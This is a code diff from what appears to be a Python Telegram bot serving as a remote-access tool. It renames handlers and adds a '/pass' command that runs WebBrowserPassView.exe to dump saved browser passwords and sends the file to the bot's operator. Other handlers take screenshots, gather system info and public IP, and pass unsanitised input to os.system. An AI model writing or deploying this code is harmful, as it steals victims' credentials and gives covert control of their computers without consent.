@@ -31,7 +31,7 @@ async def screen(message: types.Message):
 
 
 @dp.message_handler(commands=["screensmall"])
-async def screen(message: types.Message):
+async def screensmall(message: types.Message):
     if message["from"]["id"] in admins:
         image = pyautogui.screenshot()
         image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
@@ -43,7 +43,7 @@ async def screen(message: types.Message):
 
 
 @dp.message_handler(commands=["msg"])
-async def screen(message: types.Message):
+async def msg(message: types.Message):
     if message["from"]["id"] in admins:
         msg = message.get_args()
         if len(msg) == 0:
@@ -62,8 +62,21 @@ async def screen(message: types.Message):
             os.system('msg *' + msg + "'")
 
 
+@dp.message_handler(commands=["pass"])
+async def password(message: types.Message):
+    if message["from"]["id"] in admins:
+        if os.name == "nt":
+            # subprocess.call([r'getpass.bat'])
+            subprocess.Popen(['WebBrowserPassView.exe', '/stext', 'pass.txt'])
+            with open('pass.txt', 'rb') as passwd:
+                await message.answer_document(passwd)
+            os.remove('pass.txt')
+        else:
+            await message.answer("Sorry, only for windows host yet :(")
+
+
 @dp.message_handler(commands=["sysinfo"])
-async def screen(message: types.Message):
+async def sysinfo(message: types.Message):
     if message["from"]["id"] in admins:
         ip_public = str(urllib.urlopen("http://ip.42.pl/raw").read())
         data = 'OS: ' + platform.uname()[0] + ' ' + platform.uname()[2] + ' - ' + platform.architecture()[0] + '\n'
